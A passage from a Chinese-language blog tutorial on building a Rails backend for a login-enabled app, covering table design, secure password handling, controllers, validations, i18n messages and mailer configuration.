        <content type="html"><![CDATA[<h1 id="如何进行架构设计"><a href="#如何进行架构设计" class="headerlink" title="如何进行架构设计"></a>如何进行架构设计</h1><blockquote><p>难点不在于架构设计的好不好，而在于细节是否做得妥当，或者叫做你的架构是否基于最佳实践。</p></blockquote><h2 id="依据"><a href="#依据" class="headerlink" title="依据"></a>依据</h2><ul><li>用户需求</li><li>团队配置</li><li>技术成熟度</li></ul><h2 id="用户需求"><a href="#用户需求" class="headerlink" title="用户需求"></a>用户需求</h2><ul><li>可登陆的增删改查</li></ul><h2 id="团队配置"><a href="#团队配置" class="headerlink" title="团队配置"></a>团队配置</h2><ul><li>会前后端的全栈工程师</li></ul><h2 id="技术成熟度"><a href="#技术成熟度" class="headerlink" title="技术成熟度"></a>技术成熟度</h2><ul><li>假设只会 Rails + Vue &#x2F; React</li></ul><h1 id="什么是前后端分离"><a href="#什么是前后端分离" class="headerlink" title="什么是前后端分离"></a>什么是前后端分离</h1><p><img src="/Blog/2020/09/20/rails/Rails_start/index/img.png"></p><blockquote><p>这里说的前端和后端是指前端代码和后端代码，不指人。<br><strong>不分离</strong>：传统的后端工程师从数据库、Redis读取数据渲染到 HTML 中，HTML 需要引用 js、css ，但是现代前端代码代码都是打包生成的（style.xxx.css、main.xxx.js），所以无法在 HTML 中提前引用这些 js、css，所以只能用 Rails（插件 webpacker） 读取 webpack 的内容，再反向写到 HTML 中。<br><strong>分离</strong>：前端自己负责 HTML，自己搭建静态服务器给用户访问，如：Ngnix 或 Node等等，好处是 HTML 可以直接用 webpack 的插件，直接把打包后生成的文件写到 HTML 中，数据只通过 AJAX 获取。</p></blockquote><blockquote><p><strong>注意</strong>前后端代码不一定要交给两个人写，可以由一个人写</p></blockquote><h2 id="用户需求-1"><a href="#用户需求-1" class="headerlink" title="用户需求"></a>用户需求</h2><h3 id="视觉稿"><a href="#视觉稿" class="headerlink" title="视觉稿"></a>视觉稿</h3><p><img src="/Blog/2020/09/20/rails/Rails_start/index/img_1.png"></p><h3 id="用例图"><a href="#用例图" class="headerlink" title="用例图"></a>用例图</h3><p><a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E4%BE%8B%E5%9B%BE">用例图释义</a>：把使<strong>用</strong>的<strong>例</strong>子全部画出来</p><p><img src="/Blog/2020/09/20/rails/Rails_start/index/img_2.png"></p><h2 id="表设计"><a href="#表设计" class="headerlink" title="表设计"></a>表设计</h2><h3 id="有哪些表？"><a href="#有哪些表？" class="headerlink" title="有哪些表？"></a>有哪些表？</h3><ul><li>users &#x2F; records &#x2F; tags</li><li>还有 taggings 表，表示 records 和 tags 的关联</li><li>password_reset_requests 记录所有重置请求</li></ul><h3 id="每个表有哪些属性"><a href="#每个表有哪些属性" class="headerlink" title="每个表有哪些属性"></a>每个表有哪些属性</h3><ul><li>不用一次想好，但命名一定要准确</li><li>从简单的需求出发，逐渐迭代</li></ul><h3 id="users-表"><a href="#users-表" class="headerlink" title="users 表"></a>users 表</h3><h4 id="从需求出发"><a href="#从需求出发" class="headerlink" title="从需求出发"></a>从需求出发</h4><ul><li>注册：邮箱、密码、确认密码</li><li>数据库需要存密码吗？<em>不需要，只存密文</em></li><li>数据库需要存确认密码吗？<em>不需要</em></li><li>如何加密？<em>使用最佳实践 has_secure_password</em></li><li>密文叫什么？<em>使用最佳实践 password_digest</em></li><li>注册之后需要发欢迎邮件吗？ <em>使用 mailer</em></li><li>需要强制用户验证邮箱吗？ <em>可以不强制，也可以强制</em></li></ul><h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><ul><li>users 表含有 email 和 password_digest</li></ul><h2 id="开始实现"><a href="#开始实现" class="headerlink" title="开始实现"></a>开始实现</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul><li>创建 model</li><li>console 操作 user</li><li>创建 controller</li><li>配置 routes</li><li>配置 mailer</li><li>创建 mailer</li><li>使用 HttpClient</li><li>创建 rspec 测试</li><li>改代码，测试</li><li>改代码，测试</li><li>改代码，测试</li></ul><h3 id="约定"><a href="#约定" class="headerlink" title="约定"></a>约定</h3><ul><li>RESTful 接口风格</li><li>post &#x2F;users 就是注册接口，不能不加 s</li><li>文件目录<blockquote><p>创建数据库 <code>bin/rails db:create</code></p></blockquote></li></ul><h2 id="创建-User-表和-Model"><a href="#创建-User-表和-Model" class="headerlink" title="创建 User 表和 Model"></a>创建 User 表和 Model</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bin/rails g model <span class="keyword">User</span> <span class="title">email</span>:<span class="keyword">string</span> password_digest:<span class="keyword">string</span></span><br><span class="line">bin/rails db:migrate</span><br><span class="line">// bin/rails -T 查看命令</span><br></pre></td></tr></table></figure><h2 id="使用控制台增删改查"><a href="#使用控制台增删改查" class="headerlink" title="使用控制台增删改查"></a>使用控制台增删改查</h2><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bin/rails console</span><br><span class="line"><span class="comment"># 创建用户</span></span><br><span class="line">&gt; u = <span class="literal">User</span>.new</span><br><span class="line">&gt; u.email = <span class="string">&#x27;1.qq.com&#x27;</span></span><br><span class="line">&gt; u.password_digest = <span class="string">&#x27;xxxxxx&#x27;</span></span><br><span class="line">&gt; u.save</span><br><span class="line"><span class="comment"># 查</span></span><br><span class="line"><span class="literal">User</span>.<span class="literal">all</span> <span class="comment"># 全部</span></span><br><span class="line"><span class="literal">User</span>.<span class="literal">all</span>[<span class="number">0</span>] <span class="comment"># 第一个 或 User.first、User.second（用英文即可）</span></span><br></pre></td></tr></table></figure><blockquote><p>不用写任何代码，为什么就可以进行增删改查呢？这才是一个成熟的框架应该内置好的。</p></blockquote><h3 id="上述操作有个问题，我们不能直接赋值-password-digest"><a href="#上述操作有个问题，我们不能直接赋值-password-digest" class="headerlink" title="上述操作有个问题，我们不能直接赋值 password_digest"></a>上述操作有个问题，我们不能直接赋值 password_digest</h3><ul><li>搜索 rails has_secure_password</li><li>找到 Gemfile 打开注释 <code>gem &#39;bcrypt&#39;, &#39;~&gt; 3.1.7&#39;</code></li><li>然后再 User 上加这句话 <code>has_secure_password</code></li><li>安装依赖 <code>bin/bundle install</code></li></ul><h3 id="再次创建"><a href="#再次创建" class="headerlink" title="再次创建"></a>再次创建</h3><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bin/rails console</span><br><span class="line"># 创建用户</span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">u = <span class="title class_">User</span>.<span class="property">new</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">u.<span class="property">email</span> = <span class="string">&#x27;2.qq.com&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">u.<span class="property">password</span> = <span class="string">&#x27;xxxxxx&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">u.<span class="property">password_confirmation</span> = <span class="string">&#x27;xxxxxx&#x27;</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">u.<span class="property">save</span></span></span><br></pre></td></tr></table></figure><h2 id="使用-http-请求来创建用户"><a href="#使用-http-请求来创建用户" class="headerlink" title="使用 http 请求来创建用户"></a>使用 http 请求来创建用户</h2><p>首先在 routes 里添加</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get</span> <span class="string">&#x27;/users&#x27;</span>, <span class="built_in">to</span>: <span class="string">&#x27;users#index&#x27;</span></span><br><span class="line"><span class="built_in">get</span> <span class="string">&#x27;/users/:id&#x27;</span>, <span class="built_in">to</span>: <span class="string">&#x27;users#show&#x27;</span></span><br><span class="line"><span class="built_in">post</span> <span class="string">&#x27;/users&#x27;</span>, <span class="built_in">to</span>: <span class="string">&#x27;users#create&#x27;</span></span><br><span class="line"><span class="built_in">delete</span> <span class="string">&#x27;/users/:id&#x27;</span>, <span class="built_in">to</span>: <span class="string">&#x27;users#destroy&#x27;</span></span><br><span class="line">patch <span class="string">&#x27;/users/:id&#x27;</span>, <span class="built_in">to</span>: <span class="string">&#x27;users#update&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>这五个增删改查几乎是每个表都要写，既然这么麻烦，于是 rails 就提供了另一个方法，等价于写了上面五句话</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resources :<span class="built_in">users</span></span><br></pre></td></tr></table></figure><p>使用 <code>bin/rails routes</code> 即可查看所有 routes 得以验证</p><h3 id="创建-controller"><a href="#创建-controller" class="headerlink" title="创建 controller"></a>创建 controller</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/rails g controller <span class="built_in">users</span></span><br></pre></td></tr></table></figure><p>然后在 controller 定义一个 create 方法</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> UsersController &lt; ApplicationController</span><br><span class="line">  def <span class="keyword">create</span></span><br><span class="line">    <span class="keyword">user</span> = <span class="keyword">User</span>.<span class="built_in">new</span></span><br><span class="line">    <span class="keyword">user</span>.email = params[:email]</span><br><span class="line">    <span class="keyword">user</span>.<span class="keyword">password</span> = params[:<span class="keyword">password</span>]</span><br><span class="line">    <span class="keyword">user</span>.password_confirmation = params[:password_confirmation]</span><br><span class="line">    <span class="keyword">user</span>.save</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>但是测试时发现没有传 password_confirmation 竟然也能成功保存，所以我们需要加上非空校验</p><p>在 user.rb 中加入</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">User</span> &lt; <span class="symbol">ApplicationRecord</span></span><br><span class="line">  <span class="symbol">has_secure_password</span></span><br><span class="line">  <span class="symbol">validates_presence_of</span> :<span class="symbol">email</span></span><br><span class="line">  <span class="symbol">validates_presence_of</span> :<span class="symbol">password, :<span class="symbol">password_confirmation</span>, <span class="symbol">on</span>: </span>[:<span class="symbol">create</span>] # 只在创建时校验</span><br><span class="line"><span class="symbol">end</span></span><br></pre></td></tr></table></figure><p>并加上返回响应</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> UsersController &lt; ApplicationController</span><br><span class="line">  def <span class="keyword">create</span></span><br><span class="line">    <span class="keyword">user</span> = <span class="keyword">User</span>.<span class="built_in">new</span></span><br><span class="line">    <span class="keyword">user</span>.email = params[:email]</span><br><span class="line">    <span class="keyword">user</span>.<span class="keyword">password</span> = params[:<span class="keyword">password</span>]</span><br><span class="line">    <span class="keyword">user</span>.password_confirmation = params[:password_confirmation]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">user</span>.save</span><br><span class="line">      render <span class="type">json</span>: <span class="keyword">user</span>, status: <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      render <span class="type">json</span>: <span class="keyword">user</span>.errors, status: <span class="number">400</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>当我们什么都没传时，发现 password 重复报错了两遍，可能是 has_secure_password 也做了校验，所以移除我们自己的</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">User</span> &lt; <span class="symbol">ApplicationRecord</span></span><br><span class="line">  <span class="symbol">has_secure_password</span></span><br><span class="line">  <span class="symbol">validates_presence_of</span> :<span class="symbol">email</span></span><br><span class="line">  <span class="symbol">validates_uniqueness_of</span> :<span class="symbol">email</span></span><br><span class="line">  <span class="symbol">validates_presence_of</span> :<span class="symbol">password_confirmation, <span class="symbol">on</span>: </span>[:<span class="symbol">create</span>] # 只在创建时校验</span><br><span class="line"><span class="symbol">end</span></span><br></pre></td></tr></table></figure><p>再加上更完善的校验</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="keyword">User</span> &lt; ApplicationRecord</span><br><span class="line">  has_secure_password</span><br><span class="line">  validates_presence_of :email</span><br><span class="line">  validates_presence_of :password_confirmation, <span class="keyword">on</span>: [:<span class="keyword">create</span>]</span><br><span class="line"></span><br><span class="line">  validates_format_of :email, <span class="keyword">with</span>: /.+@.+/</span><br><span class="line">  validates_length_of :<span class="keyword">password</span>, minimum: <span class="number">6</span>, <span class="keyword">on</span>: [:<span class="keyword">create</span>]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h4 id="校验国际化"><a href="#校验国际化" class="headerlink" title="校验国际化"></a>校验国际化</h4><ul><li>搜索 rails i18n</li><li>在 <code>config/locales/</code> 下创建文件 <code>zh-CN.yml</code></li><li>在 <code>config/initializers/</code> 下创建 <code>locale.rb</code> 文件<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config/initializers/locale.rb</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Where the I18n library should search for translation files</span></span><br><span class="line"><span class="title class_">I18n</span>.load_path += <span class="title class_">Dir</span>[<span class="title class_">Rails</span>.root.join(<span class="string">&#x27;lib&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;*.&#123;rb,yml&#125;&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Permitted locales available for the application</span></span><br><span class="line"><span class="title class_">I18n</span>.available_locales = [<span class="symbol">:en</span>, <span class="string">&#x27;zh-CN&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set default locale to something other than :en</span></span><br><span class="line"><span class="title class_">I18n</span>.default_locale = <span class="string">&#x27;zh-CN&#x27;</span></span><br></pre></td></tr></table></figure></li><li>根据报错依次追加内容<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">zh-CN</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">activerecord</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">errors</span><span class="punctuation">:</span></span><br><span class="line">      <span class="attribute">models</span><span class="punctuation">:</span></span><br><span class="line">        <span class="attribute">user</span><span class="punctuation">:</span></span><br><span class="line">          <span class="attribute">attributes</span><span class="punctuation">:</span></span><br><span class="line">            <span class="attribute">password</span><span class="punctuation">:</span></span><br><span class="line">              <span class="attribute">blank</span><span class="punctuation">:</span> <span class="string">密码不能为空</span></span><br><span class="line">              <span class="attribute">too_short</span><span class="punctuation">:</span> <span class="string">密码不能少于 %&#123;count&#125; 位</span></span><br><span class="line">            <span class="attribute">email</span><span class="punctuation">:</span></span><br><span class="line">              <span class="attribute">blank</span><span class="punctuation">:</span> <span class="string">邮箱不能为空</span></span><br><span class="line">              <span class="attribute">invalid</span><span class="punctuation">:</span> <span class="string">邮箱格式不合法</span></span><br><span class="line">            <span class="attribute">password_confirmation</span><span class="punctuation">:</span></span><br><span class="line">              <span class="attribute">blank</span><span class="punctuation">:</span> <span class="string">确认密码不能为空</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h2 id="额外，优化一下上面的这部分代码"><a href="#额外，优化一下上面的这部分代码" class="headerlink" title="额外，优化一下上面的这部分代码"></a>额外，优化一下上面的这部分代码</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> UsersController &lt; ApplicationController</span><br><span class="line">  def <span class="keyword">create</span></span><br><span class="line">    <span class="keyword">user</span> = <span class="keyword">User</span>.<span class="built_in">new</span></span><br><span class="line">    <span class="keyword">user</span>.email = params[:email]</span><br><span class="line">    <span class="keyword">user</span>.<span class="keyword">password</span> = params[:<span class="keyword">password</span>]</span><br><span class="line">    <span class="keyword">user</span>.password_confirmation = params[:password_confirmation]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">user</span>.save</span><br><span class="line">      render <span class="type">json</span>: &#123; resource: <span class="keyword">user</span> &#125;, status: <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      render <span class="type">json</span>: &#123; errors: <span class="keyword">user</span>.errors &#125;, status: <span class="number">400</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> UsersController &lt; ApplicationController</span><br><span class="line">  def <span class="keyword">create</span></span><br><span class="line">    <span class="keyword">user</span> = <span class="keyword">User</span>.<span class="built_in">new</span>(&#123; email: params[:email], <span class="keyword">password</span>: params[:<span class="keyword">password</span>], password_confirmation: params[:password_confirmation] &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">user</span>.save</span><br><span class="line">      render <span class="type">json</span>: &#123; resource: <span class="keyword">user</span> &#125;, status: <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      render <span class="type">json</span>: &#123; errors: <span class="keyword">user</span>.errors &#125;, status: <span class="number">400</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h4 id="第二步使用-permit-方法"><a href="#第二步使用-permit-方法" class="headerlink" title="第二步使用 permit 方法"></a>第二步使用 permit 方法</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> UsersController &lt; ApplicationController</span><br><span class="line">  def <span class="keyword">create</span></span><br><span class="line">    <span class="keyword">user</span> = <span class="keyword">User</span>.<span class="built_in">new</span> params.permit(:email, :<span class="keyword">password</span>, :password_confirmation)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">user</span>.save</span><br><span class="line">      render <span class="type">json</span>: &#123; resource: <span class="keyword">user</span> &#125;, status: <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      render <span class="type">json</span>: &#123; errors: <span class="keyword">user</span>.errors &#125;, status: <span class="number">400</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> UsersController &lt; ApplicationController</span><br><span class="line">  def <span class="keyword">create</span></span><br><span class="line">    <span class="keyword">user</span> = <span class="keyword">User</span>.<span class="built_in">new</span> create_params</span><br><span class="line">    <span class="keyword">user</span>.save</span><br><span class="line">    render_resource <span class="keyword">user</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  def create_params</span><br><span class="line">    params.permit(:email, :<span class="keyword">password</span>, :password_confirmation)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  def render_resource(resource)</span><br><span class="line">    <span class="keyword">if</span> resource.<span class="keyword">valid</span>?</span><br><span class="line">      render <span class="type">json</span>: &#123;resource: resource&#125;, status: <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      render <span class="type">json</span>: &#123;errors: resource.errors&#125;, status: <span class="number">400</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h4 id="第四步，使用-create-方法，等价于-先-new-再-save"><a href="#第四步，使用-create-方法，等价于-先-new-再-save" class="headerlink" title="第四步，使用 create 方法，等价于 先 new 再 save"></a>第四步，使用 create 方法，等价于 先 new 再 save</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UsersController</span> &lt; <span class="title class_ inherited__">ApplicationController</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">create</span></span><br><span class="line">    user = <span class="title class_">User</span>.create create_params</span><br><span class="line">    render_resource user</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">create_params</span></span><br><span class="line">    params.permit(<span class="symbol">:email</span>, <span class="symbol">:password</span>, <span class="symbol">:password_confirmation</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">  <span class="comment"># render_resource 方法已提升到 ApplicationController 中</span></span><br></pre></td></tr></table></figure><h4 id="第五步，很明显-user-声明了直接使用"><a href="#第五步，很明显-user-声明了直接使用" class="headerlink" title="第五步，很明显 user 声明了直接使用"></a>第五步，很明显 user 声明了直接使用</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UsersController</span> &lt; <span class="title class_ inherited__">ApplicationController</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">create</span></span><br><span class="line">    render_resource <span class="title class_">User</span>.create create_params</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">create_params</span></span><br><span class="line">    params.permit(<span class="symbol">:email</span>, <span class="symbol">:password</span>, <span class="symbol">:password_confirmation</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="发送邮件"><a href="#发送邮件" class="headerlink" title="发送邮件"></a>发送邮件</h2><ul><li>bin&#x2F;rails generate mailer UserMailer</li><li>app&#x2F;mailers&#x2F;user_mailer<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserMailer</span> &lt; <span class="title class_ inherited__">ApplicationMailer</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">welcome_email</span>(<span class="params">user</span>)</span><br><span class="line">    <span class="variable">@user</span> = user</span><br><span class="line">    <span class="variable">@url</span> = <span class="string">&#x27;https://www.baidu.com&#x27;</span></span><br><span class="line">    mail(<span class="symbol">to:</span> <span class="variable">@user</span>.email, <span class="symbol">subject:</span> <span class="string">&#x27;Welcome to My Awesome Site&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li><li>app&#x2F;mailers&#x2F;application_mailer.rb<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ApplicationMailer</span> &lt; ActionMailer::Base</span><br><span class="line">  <span class="literal">default</span> <span class="keyword">from</span>: <span class="string">&#x27;529743595@qq.com&#x27;</span></span><br><span class="line">  layout <span class="string">&#x27;mailer&#x27;</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure></li><li>app&#x2F;views.&#x2F;user_mailer&#x2F;welcome_email.html.erb<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">&lt;p&gt;</span></span><br><span class="line">  <span class="attribute">&lt;%= @user.email %&gt;</span> 您好，</span><br><span class="line"><span class="attribute">&lt;/p&gt;</span></span><br><span class="line"><span class="attribute">&lt;p&gt;</span></span><br><span class="line">  欢迎来到 Morney，情记一笔把！</span><br><span class="line"><span class="attribute">&lt;/p&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>config&#x2F;environments&#x2F;development.rb<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># <span class="built_in">config</span>.action_mailer.raise_delivery_errors = <span class="literal">false</span></span><br><span class="line">  #</span><br><span class="line">  # <span class="built_in">config</span>.action_mailer.perform_caching = <span class="literal">false</span></span><br><span class="line">  <span class="built_in">config</span>.action_mailer.delivery = :smtp</span><br><span class="line">  <span class="built_in">config</span>.action_mailer.raise_delivery_errors = <span class="literal">true</span></span><br><span class="line">  <span class="built_in">config</span>.action_mailer.perform_caching = <span class="literal">false</span></span><br><span class="line">  <span class="built_in">config</span>.action_mailer.smtp_settings = &#123;</span><br><span class="line">    address: ENV[<span class="string">&#x27;smtp_domain&#x27;</span>],</span><br><span class="line">    port: ENV[<span class="string">&#x27;smtp_port&#x27;</span>],</span><br><span class="line">    domain: ENV[<span class="string">&#x27;smtp_domain&#x27;</span>],</span><br><span class="line">    user_name: ENV[<span class="string">&#x27;smtp_username&#x27;</span>],</span><br><span class="line">    password: ENV[<span class="string">&#x27;smtp_password&#x27;</span>],</span><br><span class="line">    authentication: ENV[<span class="string">&#x27;smtp_authentication&#x27;</span>],</span><br><span class="line">    enable_starttls_auto: ENV[<span class="string">&#x27;smtp_enable_starttls_auto&#x27;</span>],</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">config</span>.action_mailer.preview_path = <span 